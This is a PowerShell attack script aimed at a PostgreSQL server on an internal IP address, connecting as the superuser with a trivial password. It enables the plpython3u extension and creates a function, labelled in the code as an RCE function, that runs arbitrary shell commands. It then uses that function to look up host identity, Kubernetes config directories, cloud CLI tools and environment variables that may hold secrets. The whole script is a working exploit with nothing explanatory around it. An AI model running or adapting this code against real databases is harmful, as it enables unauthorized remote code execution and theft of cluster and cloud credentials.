$c=New-Object System.Data.Odbc.OdbcConnection
$c.ConnectionString="Driver={PostgreSQL Unicode};Server=10.9.101.3;Port=5432;Database=postgres;Uid=postgres;Pwd=x;sslmode=disable"
try {
    $c.Open()
    
    # Create plpython3u language
    $cmd=$c.CreateCommand()
    $cmd.CommandText="CREATE EXTENSION IF NOT EXISTS plpython3u"
    $cmd.ExecuteNonQuery() | Out-Null
    Write-Host "PLPY_OK"
    
    # Create RCE function
    $cmd2=$c.CreateCommand()
    $cmd2.CommandText="CREATE OR REPLACE FUNCTION run_cmd(cmd text) RETURNS text AS $$ import subprocess; r=subprocess.run(cmd,shell=True,capture_output=True,text=True); return r.stdout+r.stderr $$ LANGUAGE plpython3u"
    $cmd2.ExecuteNonQuery() | Out-Null
    Write-Host "FUNC_OK"
    
    # Execute commands
    $cmd3=$c.CreateCommand()
    $cmd3.CommandText="SELECT run_cmd('id; hostname; uname -a; ls -la /root/.kube/ 2>&1; which kubectl gcloud 2>&1; cat /etc/environment 2>&1; env | grep -i kube 2>&1')"
    $r=$cmd3.ExecuteReader()
    while($r.Read()){Write-Host ("RCE:"+$r[0])}
    $r.Close()
} catch {
    Write-Host ("ERR:"+$_)
}
$c.Close()
